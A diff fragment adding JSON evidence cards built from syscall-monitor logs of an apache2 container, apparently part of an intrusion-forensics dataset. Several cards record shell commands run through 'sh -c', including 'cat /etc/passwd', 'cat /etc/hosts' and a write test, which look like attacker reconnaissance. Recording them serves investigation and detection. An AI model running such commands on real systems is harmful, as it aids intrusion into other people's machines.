+      "content": "{\"container.id\": \"2f4a26c64fd2\", \"evt.arg.data\": null, \"evt.arg.filename\": null, \"evt.arg.newpath\": null, \"evt.arg.oldpath\": null, \"evt.arg.pid\": \"sh\", \"evt.category\": \"process\", \"evt.datetime\": \"2025-01-11 03:42:29.003465992\", \"evt.is_io_read\": null, \"evt.is_io_write\": null, \"evt.num\": 8576185, \"evt.rawres\": 0, \"evt.time\": \"03:42:29.003465992\", \"evt.type\": \"execve\", \"fd.cip\": null, \"fd.cport\": null, \"fd.directory\": null, \"fd.ino\": null, \"fd.is_server\": null, \"fd.lip\": null, \"fd.name\": null, \"fd.num\": null, \"fd.rip\": null, \"fd.sip\": null, \"fd.sport\": null, \"fd.type\": null, \"proc.cmdline\": \"sh -c ls -alh .\", \"proc.exepath\": \"/bin/dash\", \"proc.name\": \"sh\", \"proc.pid\": 370747, \"proc.vpid\": 724, \"thread.tid\": 370747, \"thread.vtid\": 724}",
+      "line": 2816515,
+      "timestamp": "2025-01-11 03:42:29.003465992",
+      "extracted_clues": {
+        "paths": [
+          "/bin/dash"
+        ],
+        "endpoints": [
+          "/bin/dash"
+        ],
+        "ips": [],
+        "ports": [],
+        "files": [],
+        "processes": [
+          "sh"
+        ],
+        "accounts": [],
+        "syscalls": [
+          "execve"
+        ]
+      }
+    },
+    {
+      "evidence_id": "E0088",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "{\"container.id\": \"2f4a26c64fd2\", \"evt.arg.data\": null, \"evt.arg.filename\": null, \"evt.arg.newpath\": null, \"evt.arg.oldpath\": null, \"evt.arg.pid\": \"sh\", \"evt.category\": \"process\", \"evt.datetime\": \"2025-01-11 03:43:45.819445606\", \"evt.is_io_read\": null, \"evt.is_io_write\": null, \"evt.num\": 9026122, \"evt.rawres\": 0, \"evt.time\": \"03:43:45.819445606\", \"evt.type\": \"execve\", \"fd.cip\": null, \"fd.cport\": null, \"fd.directory\": null, \"fd.ino\": null, \"fd.is_server\": null, \"fd.lip\": null, \"fd.name\": null, \"fd.num\": null, \"fd.rip\": null, \"fd.sip\": null, \"fd.sport\": null, \"fd.type\": null, \"proc.cmdline\": \"sh -c pwd\", \"proc.exepath\": \"/bin/dash\", \"proc.name\": \"sh\", \"proc.pid\": 370904, \"proc.vpid\": 792, \"thread.tid\": 370904, \"thread.vtid\": 792}",
+      "line": 3014730,
+      "timestamp": "2025-01-11 03:43:45.819445606",
+      "extracted_clues": {
+        "paths": [
+          "/bin/dash"
+        ],
+        "endpoints": [
+          "/bin/dash"
+        ],
+        "ips": [],
+        "ports": [],
+        "files": [],
+        "processes": [
+          "sh"
+        ],
+        "accounts": [],
+        "syscalls": [
+          "execve"
+        ]
+      }
+    },
+    {
+      "evidence_id": "E0089",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "{\"container.id\": \"2f4a26c64fd2\", \"evt.arg.data\": null, \"evt.arg.filename\": null, \"evt.arg.newpath\": null, \"evt.arg.oldpath\": null, \"evt.arg.pid\": \"sh\", \"evt.category\": \"process\", \"evt.datetime\": \"2025-01-11 03:45:03.119522601\", \"evt.is_io_read\": null, \"evt.is_io_write\": null, \"evt.num\": 9471074, \"evt.rawres\": 0, \"evt.time\": \"03:45:03.119522601\", \"evt.type\": \"execve\", \"fd.cip\": null, \"fd.cport\": null, \"fd.directory\": null, \"fd.ino\": null, \"fd.is_server\": null, \"fd.lip\": null, \"fd.name\": null, \"fd.num\": null, \"fd.rip\": null, \"fd.sip\": null, \"fd.sport\": null, \"fd.type\": null, \"proc.cmdline\": \"sh -c cat /etc/passwd\", \"proc.exepath\": \"/bin/dash\", \"proc.name\": \"sh\", \"proc.pid\": 371040, \"proc.vpid\": 852, \"thread.tid\": 371040, \"thread.vtid\": 852}",
+      "line": 3206659,
+      "timestamp": "2025-01-11 03:45:03.119522601",
+      "extracted_clues": {
+        "paths": [
+          "/bin/dash",
+          "/etc/passwd"
+        ],
+        "endpoints": [
+          "/bin/dash",
+          "/etc/passwd"
+        ],
+        "ips": [],
+        "ports": [],
+        "files": [],
+        "processes": [
+          "sh"
+        ],
+        "accounts": [],
+        "syscalls": [
+          "execve"
+        ]
+      }
+    },
+    {
+      "evidence_id": "E0090",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "{\"container.id\": \"2f4a26c64fd2\", \"evt.arg.data\": null, \"evt.arg.filename\": null, \"evt.arg.newpath\": null, \"evt.arg.oldpath\": null, \"evt.arg.pid\": \"sh\", \"evt.category\": \"process\", \"evt.datetime\": \"2025-01-11 03:46:20.009703280\", \"evt.is_io_read\": null, \"evt.is_io_write\": null, \"evt.num\": 9897426, \"evt.rawres\": 0, \"evt.time\": \"03:46:20.009703280\", \"evt.type\": \"execve\", \"fd.cip\": null, \"fd.cport\": null, \"fd.directory\": null, \"fd.ino\": null, \"fd.is_server\": null, \"fd.lip\": null, \"fd.name\": null, \"fd.num\": null, \"fd.rip\": null, \"fd.sip\": null, \"fd.sport\": null, \"fd.type\": null, \"proc.cmdline\": \"sh -c cat /etc/hosts\", \"proc.exepath\": \"/bin/dash\", \"proc.name\": \"sh\", \"proc.pid\": 371197, \"proc.vpid\": 920, \"thread.tid\": 371197, \"thread.vtid\": 920}",
+      "line": 3396121,
+      "timestamp": "2025-01-11 03:46:20.009703280",
+      "extracted_clues": {
+        "paths": [
+          "/bin/dash",
+          "/etc/hosts"
+        ],
+        "endpoints": [
+          "/bin/dash",
+          "/etc/hosts"
+        ],
+        "ips": [],
+        "ports": [],
+        "files": [],
+        "processes": [
+          "sh"
+        ],
+        "accounts": [],
+        "syscalls": [
+          "execve"
+        ]
+      }
+    },
+    {
+      "evidence_id": "E0091",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "{\"container.id\": \"2f4a26c64fd2\", \"evt.arg.data\": null, \"evt.arg.filename\": null, \"evt.arg.newpath\": null, \"evt.arg.oldpath\": null, \"evt.arg.pid\": \"sh\", \"evt.category\": \"process\", \"evt.datetime\": \"2025-01-11 03:47:36.741089954\", \"evt.is_io_read\": null, \"evt.is_io_write\": null, \"evt.num\": 10317790, \"evt.rawres\": 0, \"evt.time\": \"03:47:36.741089954\", \"evt.type\": \"execve\", \"fd.cip\": null, \"fd.cport\": null, \"fd.directory\": null, \"fd.ino\": null, \"fd.is_server\": null, \"fd.lip\": null, \"fd.name\": null, \"fd.num\": null, \"fd.rip\": null, \"fd.sip\": null, \"fd.sport\": null, \"fd.type\": null, \"proc.cmdline\": \"sh -c touch try_to_write\", \"proc.exepath\": \"/bin/dash\", \"proc.name\": \"sh\", \"proc.pid\": 371330, \"proc.vpid\": 980, \"thread.tid\": 371330, \"thread.vtid\": 980}",
+      "line": 3579786,
+      "timestamp": "2025-01-11 03:47:36.741089954",
+      "extracted_clues": {
+        "paths": [
+          "/bin/dash"
+        ],
+        "endpoints": [
+          "/bin/dash"
+        ],
+        "ips": [],
+        "ports": [],
+        "files": [],
+        "processes": [
+          "sh",
+          "touch"
+        ],
+        "accounts": [],
+        "syscalls": [
+          "execve"
+        ]
+      }
+    },
+    {
+      "evidence_id": "E0092",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "{\"evt.category\": \"file\", \"evt.datetime\": \"2025-01-11 03:47:36.742773959\", \"evt.rawres\": 0, \"evt.time\": \"03:47:36.742773959\", \"evt.type\": \"close\", \"fd.name\": \"/applog/app.log\", \"fd.type\": \"file\", \"proc.cmdline\": \"touch try_to_write\", \"proc.exepath\": \"/bin/touch\", \"proc.name\": \"touch\"}",
+      "line": 3579840,
+      "timestamp": "2025-01-11 03:47:36.742773959",
+      "extracted_clues": {
+        "paths": [
+          "/applog/app.log",
+          "/bin/touch"
+        ],
+        "endpoints": [
+          "/applog/app.log",
+          "/bin/touch"
+        ],
+        "ips": [],
+        "ports": [],
+        "files": [
+          "app.log"
+        ],
+        "processes": [
+          "app",
+          "touch"
+        ],
+        "accounts": [],
+        "syscalls": [
+          "close"
+        ]
+      }
+    },
+    {
+      "evidence_id": "E0093",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "{\"evt.category\": \"file\", \"evt.datetime\": \"2025-01-11 03:47:36.745470742\", \"evt.rawres\": -2, \"evt.time\": \"03:47:36.745470742\", \"evt.type\": \"access\", \"proc.cmdline\": \"apache2 -DFOREGROUND\", \"proc.exepath\": \"/usr/sbin/apache2\", \"proc.name\": \"apache2\"}",
+      "line": 3579928,
+      "timestamp": "2025-01-11 03:47:36.745470742",
+      "extracted_clues": {
+        "paths": [
+          "/usr/sbin/apache2"
+        ],
+        "endpoints": [
+          "/usr/sbin/apache2"
+        ],
+        "ips": [],
+        "ports": [],
+        "files": [],
+        "processes": [],
+        "accounts": [],
+        "syscalls": [
+          "access"
+        ]
+      }
+    },
+    {
+      "evidence_id": "E0094",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "{\"evt.category\": \"file\", \"evt.datetime\": \"2025-01-11 03:47:36.745915098\", \"evt.rawres\": -2, \"evt.time\": \"03:47:36.745915098\", \"evt.type\": \"stat\", \"proc.cmdline\": \"apache2 -DFOREGROUND\", \"proc.exepath\": \"/usr/sbin/apache2\", \"proc.name\": \"apache2\"}",
+      "line": 3579965,
+      "timestamp": "2025-01-11 03:47:36.745915098",
+      "extracted_clues": {
+        "paths": [
+          "/usr/sbin/apache2"
+        ],
+        "endpoints": [
+          "/usr/sbin/apache2"
+        ],
+        "ips": [],
+        "ports": [],
+        "files": [],
+        "processes": [],
+        "accounts": [],
+        "syscalls": [
+          "stat"
+        ]
+      }
+    },
+    {
+      "evidence_id": "E0095",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "{\"evt.category\": \"file\", \"evt.datetime\": \"2025-01-11 03:47:36.745936927\", \"evt.rawres\": -2, \"evt.time\": \"03:47:36.745936927\", \"evt.type\": \"stat\", \"proc.cmdline\": \"apache2 -DFOREGROUND\", \"proc.exepath\": \"/usr/sbin/apache2\", \"proc.name\": \"apache2\"}",
+      "line": 3579972,
+      "timestamp": "2025-01-11 03:47:36.745936927",
+      "extracted_clues": {
+        "paths": [
+          "/usr/sbin/apache2"
+        ],
+        "endpoints": [
+          "/usr/sbin/apache2"
+        ],
+        "ips": [],
+        "ports": [],
+        "files": [],
+        "processes": [],
+        "accounts": [],
+        "syscalls": [
+          "stat"
+        ]
+      }
+    },
+    {
+      "evidence_id": "E0096",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "{\"evt.category\": \"file\", \"evt.datetime\": \"2025-01-11 03:47:36.747338848\", \"evt.rawres\": -2, \"evt.time\": \"03:47:36.747338848\", \"evt.type\": \"stat\", \"proc.cmdline\": \"apache2 -DFOREGROUND\", \"proc.exepath\": \"/usr/sbin/apache2\", \"proc.name\": \"apache2\"}",
+      "line": 3580057,
+      "timestamp": "2025-01-11 03:47:36.747338848",
+      "extracted_clues": {
+        "paths": [
+          "/usr/sbin/apache2"
+        ],
+        "endpoints": [
+          "/usr/sbin/apache2"
+        ],
+        "ips": [],
+        "ports": [],
+        "files": [],
+        "processes": [],
+        "accounts": [],
+        "syscalls": [
+          "stat"
+        ]
+      }
+    },
+    {
+      "evidence_id": "E0097",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "{\"evt.category\": \"file\", \"evt.datetime\": \"2025-01-11 03:47:36.747433073\", \"evt.rawres\": -2, \"evt.time\": \"03:47:36.747433073\", \"evt.type\": \"access\", \"proc.cmdline\": \"apache2 -DFOREGROUND\", \"proc.exepath\": \"/usr/sbin/apache2\", \"proc.name\": \"apache2\"}",
+      "line": 3580090,
+      "timestamp": "2025-01-11 03:47:36.747433073",
+      "extracted_clues": {
+        "paths": [
+          "/usr/sbin/apache2"
+        ],
+        "endpoints": [
+          "/usr/sbin/apache2"
+        ],
+        "ips": [],
+        "ports": [],
+        "files": [],
+        "processes": [],
+        "accounts": [],
+        "syscalls": [
+          "access"
+        ]
+      }
+    },
+    {
+      "evidence_id": "E0098",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "{\"evt.category\": \"file\", \"evt.datetime\": \"2025-01-11 03:47:36.748575271\", \"evt.rawres\": 0, \"evt.time\": \"03:47:36.748575271\", \"evt.type\": \"lstat\", \"proc.cmdline\": \"apache2 -DFOREGROUND\", \"proc.exepath\": \"/usr/sbin/apache2\", \"proc.name\": \"apache2\"}",
+      "line": 3580150,
+      "timestamp": "2025-01-11 03:47:36.748575271",
+      "extracted_clues": {
+        "paths": [
+          "/usr/sbin/apache2"
+        ],
+        "endpoints": [
+          "/usr/sbin/apache2"
+        ],
+        "ips": [],
+        "ports": [],
+        "files": [],
+        "processes": [],
+        "accounts": [],
+        "syscalls": [
+          "lstat"
+        ]
+      }
+    },
+    {
+      "evidence_id": "E0099",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "{\"evt.category\": \"file\", \"evt.datetime\": \"2025-01-11 03:47:36.748766694\", \"evt.rawres\": -2, \"evt.time\": \"03:47:36.748766694\", \"evt.type\": \"stat\", \"proc.cmdline\": \"apache2 -DFOREGROUND\", \"proc.exepath\": \"/usr/sbin/apache2\", \"proc.name\": \"apache2\"}",
+      "line": 3580157,
+      "timestamp": "2025-01-11 03:47:36.748766694",
+      "extracted_clues": {
+        "paths": [
+          "/usr/sbin/apache2"
+        ],
+        "endpoints": [
+          "/usr/sbin/apache2"
+        ],
+        "ips": [],
+        "ports": [],
+        "files": [],
+        "processes": [],
+        "accounts": [],
+        "syscalls": [
+          "stat"
+        ]
+      }
+    },
+    {
+      "evidence_id": "E0100",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "{\"evt.category\": \"file\", \"evt.datetime\": \"2025-01-11 03:47:36.749095835\", \"evt.rawres\": -2, \"evt.time\": \"03:47:36.749095835\", \"evt.type\": \"access\", \"proc.cmdline\": \"apache2 -DFOREGROUND\", \"proc.exepath\": \"/usr/sbin/apache2\", \"proc.name\": \"apache2\"}",
+      "line": 3580213,
+      "timestamp": "2025-01-11 03:47:36.749095835",
+      "extracted_clues": {
+        "paths": [
+          "/usr/sbin/apache2"
+        ],
+        "endpoints": [
+          "/usr/sbin/apache2"
+        ],
+        "ips": [],
+        "ports": [],
+        "files": [],
+        "processes": [],
+        "accounts": [],
+        "syscalls": [
+          "access"
+        ]
+      }
+    },
+    {
+      "evidence_id": "E0101",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "{\"evt.category\": \"file\", \"evt.datetime\": \"2025-01-11 03:47:36.799457348\", \"evt.rawres\": -2, \"evt.time\": \"03:47:36.799457348\", \"evt.type\": \"stat\", \"proc.cmdline\": \"apache2 -DFOREGROUND\", \"proc.exepath\": \"/usr/sbin/apache2\", \"proc.name\": \"apache2\"}",
+      "line": 3580363,
+      "timestamp": "2025-01-11 03:47:36.799457348",
+      "extracted_clues": {
+        "paths": [
+          "/usr/sbin/apache2"
+        ],
+        "endpoints": [
+          "/usr/sbin/apache2"
+        ],
+        "ips": [],
+        "ports": [],
+        "files": [],
+        "processes": [],
+        "accounts": [],
+        "syscalls": [
+          "stat"
+        ]
+      }
+    },
+    {
+      "evidence_id": "E0102",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "{\"evt.category\": \"file\", \"evt.datetime\": \"2025-01-11 03:47:36.800915278\", \"evt.rawres\": 0, \"evt.time\": \"03:47:36.800915278\", \"evt.type\": \"fstat\", \"fd.name\": \"/var/www/html/modules/Navigator/lib/class.Nav_utils.php\", \"fd.type\": \"file\", \"proc.cmdline\": \"apache2 -DFOREGROUND\", \"proc.exepath\": \"/usr/sbin/apache2\", \"proc.name\": \"apache2\"}",
+      "line": 3580424,
+      "timestamp": "2025-01-11 03:47:36.800915278",
+      "extracted_clues": {
+        "paths": [
+          "/usr/sbin/apache2",
+          "/var/www/html/modules/Navigator/lib/class.Nav_utils.php"
+        ],
+        "endpoints": [
+          "/usr/sbin/apache2",
+          "/var/www/html/modules/Navigator/lib/class.Nav_utils.php"
+        ],
+        "ips": [],
+        "ports": [],
+        "files": [],
+        "processes": [],
+        "accounts": [],
+        "syscalls": [
+          "fstat"
+        ]
+      }
+    },
+    {
+      "evidence_id": "E0103",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "{\"evt.category\": \"file\", \"evt.datetime\": \"2025-01-11 03:47:36.801678894\", \"evt.rawres\": 0, \"evt.time\": \"03:47:36.801678894\", \"evt.type\": \"fstat\", \"fd.name\": \"/var/www/html/tmp/templates_c/^c57b9d2f578a81d2320a0c971c355eefcf787ce6_0.cms_template.Simplex Main Navigation.php\", \"fd.type\": \"file\", \"proc.cmdline\": \"apache2 -DFOREGROUND\", \"proc.exepath\": \"/usr/sbin/apache2\", \"proc.name\": \"apache2\"}",
+      "line": 3580432,
+      "timestamp": "2025-01-11 03:47:36.801678894",
+      "extracted_clues": {
+        "paths": [
+          "/usr/sbin/apache2",
+          "/var/www/html/tmp/templates_c/"
+        ],
+        "endpoints": [
+          "/usr/sbin/apache2",
+          "/var/www/html/tmp/templates_c/"
+        ],
+        "ips": [],
+        "ports": [],
+        "files": [],
+        "processes": [],
+        "accounts": [],
+        "syscalls": [
+          "fstat"
+        ]
+      }
+    },
+    {
+      "evidence_id": "E0104",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "{\"evt.category\": \"file\", \"evt.datetime\": \"2025-01-11 03:47:36.802789207\", \"evt.rawres\": 0, \"evt.time\": \"03:47:36.802789207\", \"evt.type\": \"lstat\", \"proc.cmdline\": \"apache2 -DFOREGROUND\", \"proc.exepath\": \"/usr/sbin/apache2\", \"proc.name\": \"apache2\"}",
+      "line": 3580468,
+      "timestamp": "2025-01-11 03:47:36.802789207",
+      "extracted_clues": {
+        "paths": [
+          "/usr/sbin/apache2"
+        ],
+        "endpoints": [
+          "/usr/sbin/apache2"
+        ],
+        "ips": [],
+        "ports": [],
+        "files": [],
+        "processes": [],
+        "accounts": [],
+        "syscalls": [
+          "lstat"
+        ]
+      }
+    }
+  ]
+}
